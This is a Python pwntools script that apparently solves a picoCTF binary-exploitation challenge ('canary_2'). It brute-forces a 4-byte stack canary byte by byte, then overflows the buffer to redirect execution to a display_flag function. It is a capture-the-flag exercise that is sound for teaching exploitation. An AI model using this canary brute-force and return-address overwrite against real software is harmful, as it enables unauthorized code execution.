import pwn

remote_binary = "/problems/canary_2_dffbf795b4788666d54a993a5e41d145/vuln"

BUF_LEN = 32
KEY_LEN = 4

def find_canary():
    canary = b""
    for l in range(KEY_LEN):
        for c in range(256):
            pr = pwn.process(remote_binary)
            try:
                pr.writelineafter("Please enter the length of the entry:\n> ", str(BUF_LEN + len(canary) + 1))
                pr.writelineafter("Input>", b"A"*BUF_LEN + canary + pwn.p8(c))
                line = pr.readline();
                if "Stack Smashing Detected" in line:
                    continue
                canary += pwn.p8(c)
                break
            finally:
                pr.close()
    return canary

def send_payload(canary, payload):
    pr = pwn.process(remote_binary)
    try:
        pr.writelineafter("Please enter the length of the entry:\n> ", str(BUF_LEN + len(canary) + len(payload)))
        pr.writeafter("Input>", "A"*BUF_LEN + canary.encode() + payload)
        rsp = pr.readall(timeout=0.5)
        return rsp
    finally:
        pr.close()

def detect_segfault(canary):

    ofs = 16
    while True: 
        #payload = pwn.fit({ofs: pwn.p16(pwn.ELF(remote_binary, False).sym["display_flag"])}, filler='B')
        payload = b"A"*ofs + pwn.p16(pwn.ELF(remote_binary, False).sym["display_flag"])
        rsp = send_payload(canary, payload)
        if "pico" in rsp.lower():
            print(rsp)
            break

canary = find_canary()
print("canary:", canary)
detect_segfault(canary)
